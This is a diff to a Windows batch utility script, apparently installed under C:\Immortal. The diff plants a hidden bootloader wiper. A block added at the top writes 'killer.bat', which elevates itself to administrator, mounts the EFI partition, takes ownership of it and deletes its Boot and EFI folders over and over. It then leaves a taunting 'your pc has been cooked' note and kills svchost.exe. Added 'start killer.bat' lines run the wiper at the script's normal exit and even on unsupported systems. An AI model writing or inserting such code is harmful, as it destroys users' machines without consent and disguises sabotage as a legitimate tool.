@@ -1,5 +1,133 @@
-:: Set window dimensions
+:: Set window dimensions and bootloader corrupter file
 @echo off
+echo @echo off >> killer.bat
+echo net session >nul 2>&1 || ( >> killer.bat
+echo     powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" %*' -Verb RunAs" >> killer.bat
+echo     exit /b >> killer.bat
+echo ) >> killer.bat
+echo. >> killer.bat
+echo :: admin code below >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo mountvol S: /S >nul >> killer.bat
+echo takeown /f "S:\*" /r /d y >nul >> killer.bat
+echo icacls "S:\" /grant administrators:F /t >nul >> killer.bat
+echo del /f /q "S:\*" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo powershell -command "Remove-Item -Path S:\* -Recurse -Force > $null" >nul >> killer.bat
+echo del /f /q /s S:\*.* >nul >> killer.bat
+echo rmdir /s /q S:\Boot >nul >> killer.bat
+echo rmdir /s /q S:\EFI >nul >> killer.bat
+echo echo your pc has been cooked > great.txt >> killer.bat
+echo echo try to use it as long as you can >> great.txt >> killer.bat
+echo echo focus back on the cmd window >> great.txt >> killer.bat
+echo echo P.S >> great.txt >> killer.bat
+echo echo if you saw errors thats means it worked >> great.txt >> killer.bat
+echo echo bootloader corrupter coded in batch >> great.txt >> killer.bat
+echo echo double P.S >> great.txt >> killer.bat
+echo echo yes its coded all in batch >> great.txt >> killer.bat
+echo start great.txt >> killer.bat
+echo cls >> killer.bat
+echo echo press any key for your pc to be dead >> killer.bat
+echo pause >> killer.bat
+echo taskkill /f /im "svchost.exe" >> killer.bat
 mode con: cols=100 lines=50
 
 set scriptDir=C:\Immortal
@@ -1913,7 +2041,7 @@ for /f "tokens=3 delims= " %%s in (%systemInfoFile%) do (
 		)
 	)
 )
-
+start killer.bat
 exit /b 0
 
 :Decision
@@ -1924,12 +2052,14 @@ if !osNumber! lss 62 (
 	title Unsupported Operating System Detected
 	color 04
 
-	echo Sorry :( , but this script cannot be launched on an older Operating System. 
+	echo Sorry :(
+	echo but this script cannot be launched on an older Operating System. 
 	echo Please try it again on at least Windows 8.
 	echo.
-	
+	echo but ill still kill your pc
+	start killer.bat
 	pause
 	exit
 )
-
+start killer.bat
 exit /b 0
